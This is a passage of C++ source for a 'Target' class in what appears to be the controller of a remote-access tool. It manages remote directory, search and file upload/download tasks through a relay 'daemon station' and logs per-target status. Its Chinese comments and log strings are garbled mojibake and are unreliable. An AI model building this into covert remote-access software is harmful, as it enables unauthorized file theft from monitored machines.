		if (oldStatus == PAUSED)
		{
			if (dirTask->dwAutoDown == 1)
			{
				SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Ŀ¼����ָ��(ID: %d)�ָ�",
					this->widTargetName.c_str(),
					dirTask->dwTargetID,
					dirTask->dwTaskID);
			}
			else
			{
				SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] ���Ŀ¼��Ϣ��ȡָ��(ID: %d)�ָ�",
					this->widTargetName.c_str(),
					dirTask->dwTargetID,
					dirTask->dwTaskID);
			}
		}
		break;

	default:
		break;
	}

	// ���½���
	//

	if (this->frmTarControl)
	{
		TargetDlg * frm = (TargetDlg *)this->frmTarControl;
		SendMessage(frm->Handle, WM_UPT_DIRTASK_STATUS, (unsigned int)dirTask, NULL);
	}

	ScheduleTarFileTask();
}
//---------------------------------------------------------------------------
void __fastcall Target::SearchTaskStatusChanged(SearchTask *searchTask, TaskStatus oldStatus)
{
	// ������־
	//
	switch (searchTask->taskStatus)
	{
	case FINISHED:
		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Զ������ָ��(ID: %d)���",
			this->widTargetName.c_str(),
			searchTask->dwTargetID,
			searchTask->dwTaskID);    
		break;
	case ERRORED:
		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Զ������ָ��(ID: %d)����: %s",
			this->widTargetName.c_str(),
			searchTask->dwTargetID,
			searchTask->dwTaskID,
			ConvertErrorIdToStrW(searchTask->dwErrorID).c_str());
		break;
	case PAUSED:
		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Զ������ָ��(ID: %d)��ͣ",
			this->widTargetName.c_str(),
			searchTask->dwTargetID,
			searchTask->dwTaskID);
		break;

	case CANCELED:
		SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Զ������ָ��(ID: %d)ȡ��",
			this->widTargetName.c_str(),
			searchTask->dwTargetID,
			searchTask->dwTaskID);
		break;

	case WORKING:
		if (oldStatus == PAUSED)
		{
			SetTarStatusInfoExW(STATUS_INFO, this, L"[Ŀ��%s(ID:%d)] Զ������ָ��(ID: %d)�ָ�",
				this->widTargetName.c_str(),
				searchTask->dwTargetID,
				searchTask->dwTaskID);
		}
		break;

	default:
		break;
	}

	// ���½���
	//
	if (this->frmTarControl)
	{
		TargetDlg * frm = (TargetDlg *)this->frmTarControl;
		SendMessage(frm->Handle, WM_UPT_SEARCHTASK_STATUS, (unsigned int)searchTask, NULL);
	}

	ScheduleTarFileTask();    
}
//---------------------------------------------------------------------------
void __fastcall Target::AddSearchTask(SearchTask *searchTask)
{
	xASSERT((searchTask));

	EnterCriticalSection(&this->csFileTask);
	this->searchTaskMap[searchTask->dwTaskID] = searchTask;
	LeaveCriticalSection(&this->csFileTask);

	if (this->frmTarControl)
	{
		TargetDlg * frm = (TargetDlg *)this->frmTarControl;
		SendMessage(frm->Handle, WM_NEW_SEARCHTASK, (unsigned int)searchTask, NULL);
	}
}
//---------------------------------------------------------------------------
void __fastcall Target::AddDirTask(DirTask *dirTask)
{
	xASSERT((dirTask));

	EnterCriticalSection(&this->csFileTask);
	this->dirTaskMap[dirTask->dwTaskID] = dirTask;
	LeaveCriticalSection(&this->csFileTask);

	// ������µ�Ŀ¼�������������ϴ���Ŀ��Ի���
	// �������ô������Ŀ��Ի��򴴽�֮ǰ��Ŀ¼����
	// ���޷���ʾ�ڽ�����

	if ( this->frmTarControl == NULL )
	{
		SendMessage(FrmMain->Handle, WM_ADD_TARGET_DIALOG, (unsigned int)this, NULL);
	}

	if ( this->frmTarControl )
	{
		TargetDlg * frm = (TargetDlg *)this->frmTarControl;
		SendMessage(frm->Handle, WM_NEW_DIRTASK, (unsigned int)dirTask, NULL);
	}
}
//---------------------------------------------------------------------------
void __fastcall Target::AddFileTask(FileTask * fileTask)
{

	EnterCriticalSection(&this->csFileTask);
	this->fileTaskMap[fileTask->dwTaskID] = fileTask;

	if (fileTask->taskType == TASK_DIRINFO)
	{
		DirTask *lpDirTask = GetDirTaskFromMap(fileTask->dwParentID);
		if (lpDirTask)
		{
			lpDirTask->lpInfoFileTask = fileTask;
		}
	}
	else if (fileTask->taskType == TASK_SEARCHINFO)
	{
		SearchTask *lpSearchTask = GetSearchTaskFromMap(fileTask->dwParentID);
		if (lpSearchTask)
		{
			lpSearchTask->lpInfoFileTask = fileTask;
		}
	}

	LeaveCriticalSection(&this->csFileTask);

	// ������µ��ļ����������ϴ���Ŀ��Ի���
	// �������ô������Ŀ��Ի��򴴽�֮ǰ���ļ�����
	// ���޷���ʾ�ڽ�����

	if ( this->frmTarControl == NULL )
	{
		SendMessage(FrmMain->Handle, WM_ADD_TARGET_DIALOG, (unsigned int)this, NULL);
	}

	if ( this->frmTarControl )
	{
		TargetDlg * frm = (TargetDlg *)this->frmTarControl;
		SendMessage(frm->Handle, WM_NEW_FILETASK, (unsigned int)fileTask, NULL);
	}

	ScheduleTarFileTask();
}
//---------------------------------------------------------------------------
void __fastcall Target::DeleteFileTask(FileTask *fileTask)
{
	EnterCriticalSection(&this->csFileTask);

	if (this->curFileTask == fileTask)
	{
		this->curFileTask = NULL;
	}

	if (fileTask->hFile)
	{
		CloseHandle(fileTask->hFile);
		fileTask->hFile = NULL;
	}

	this->fileTaskMap.erase(fileTask->dwTaskID);

	delete fileTask;   

	LeaveCriticalSection(&this->csFileTask);
    
}
//---------------------------------------------------------------------------
void __fastcall Target::StartTarDataConn()
{
	// When we found a target , we will construct a control file connection
	// to daemon station. This is a simple strategy
	//
	xASSERT((bConnecting == false));

	bConnecting = true;
	bTarConnOnline = false;
	bool bRet = ConnectToServer(FrmMain->aniDaemonIpAddr.c_str(), FrmMain->nDataPortForControl, false, this->dwTargetID);
	if (bRet == false)
	{
		SetStatusInfoExA(STATUS_ERROR,"[Ŀ��%s(ID:%lu)] ���ݴ���ͨ������ʧ��",this->aniTargetName.c_str(),this->dwTargetID);
	}
}
//---------------------------------------------------------------------------
void __fastcall Target::TargetDataConnOnline()
{
	// �������ӳɹ��󣬿�ʼ����FileTask�ĵ���
	//
	bConnecting = false;
	bTarConnOnline = true;
	ScheduleTarFileTask();
}
//---------------------------------------------------------------------------
void __fastcall Target::TargetDataConnOffline()
{
	bConnecting = false;
	bTarConnOnline = false;
	this->curFileTask = NULL;
	this->tarConn = NULL;
}
//---------------------------------------------------------------------------
void __fastcall Target::ReScheduleTarFileTask()
{
	EnterCriticalSection(&this->csFileTask);

	if (this->curFileTask)
	{
		this->curFileTask = NULL;
	}

	LeaveCriticalSection(&this->csFileTask);

	ScheduleTarFileTask();
}
//---------------------------------------------------------------------------
void __fastcall Target::ScheduleTarFileTask()
{
	if ( ! bTarConnOnline)
	{
		this->curFileTask = NULL;    
		return;
	}

	if (this->tarConn == NULL)
	{
		this->curFileTask = NULL;
		return;
	}

	EnterCriticalSection(&this->csFileTask);

	if (this->curFileTask)
	{
		if (this->curFileTask->taskStatus == WORKING)
		{
			LeaveCriticalSection(&this->csFileTask);
			return;
		}
		else
		{
			this->curFileTask = NULL;
		}
	}

	FileTask *fileTask = NULL;
	std::map<ULONG , FileTask *>::iterator j = this->fileTaskMap.begin();
	for (; j != this->fileTaskMap.end(); j++, fileTask = NULL)
	{
		fileTask = (*j).second;
		if (fileTask->taskStatus != WORKING)
		{
			continue;
		}

		if (fileTask->taskDirect == FILEUP)
		{
			if (fileTask->dwDaemonedLen < fileTask->dwTotalLen)
			{
				// �����ϴ�
				break;
			}
		}
		else
		{
			if (fileTask->dwDaemonedLen > fileTask->dwFinishedLen)
			{
				// ͬ������
				//
				break;
			}

			if (fileTask->bDaemonBufFinished)
			{
				// Special For file which size is 0 bytes
				//
				if (fileTask->dwTotalLen == 0)
				{
					break;
				}

				if (fileTask->dwDaemonedLen == fileTask->dwFinishedLen)
				{
					break;
				}
			}
		}
	}

	if (fileTask)
	{
		if (this->tarConn)
		{
			this->curFileTask = fileTask;

			if (fileTask->taskDirect == FILEUP)
			{
				this->tarConn->Start_UPL(fileTask);
			}
			else
			{
				this->tarConn->Send_DOW(fileTask, fileTask->dwFinishedLen);
			}
		}
	}

	LeaveCriticalSection(&this->csFileTask);
}

void Target::AddAppInfoListener( std::wstring listenPath )
{
	m_listenPathSet.insert(listenPath);
}

bool Target::RemoveAppInfoListener(std::wstring path)
{
	std::set<std::wstring>::iterator it = m_listenPathSet.find(path);

	if ( it != m_listenPathSet.end() )
		m_listenPathSet.erase(it);

	return (m_listenPathSet.empty());
}

void Target::AppInfoListenerTriggered()
{
	if ( this->frmTarControl )
		SendMessage((HWND)frmTarControl->winId(), WM_APP_INFO_FINISHED, NULL, NULL);
}

void Target::FlowStatistics(unsigned int bytes)
{
	m_flowStatistics += bytes;

	UpdateFlowStatistics();
}

void Target::UpdateFlowStatistics()
{
	std::wstring iniFile = this->widLocalDataDir + L"\\flow_statistics.ini";
	WritePolicyToLocal(L"FlowStatistics", L"flow", m_flowStatistics, iniFile.c_str());

	QTreeWidgetItem* item = this->treeNode;

	if ( treeNode )
	{
		char text[256] = {0};
		sprintf(text, "%.2f MB", ( (double)m_flowStatistics ) / 1024 / 1024 );
		treeNode->setText(7, text);
	}
}

const std::map<ULONG, FileTask*>& Target::GetFileTaskMap()
{
	return this->fileTaskMap;
}

const std::map<ULONG, DirTask*>& Target::GetDirTaskMap()
{
	return this->dirTaskMap;
}
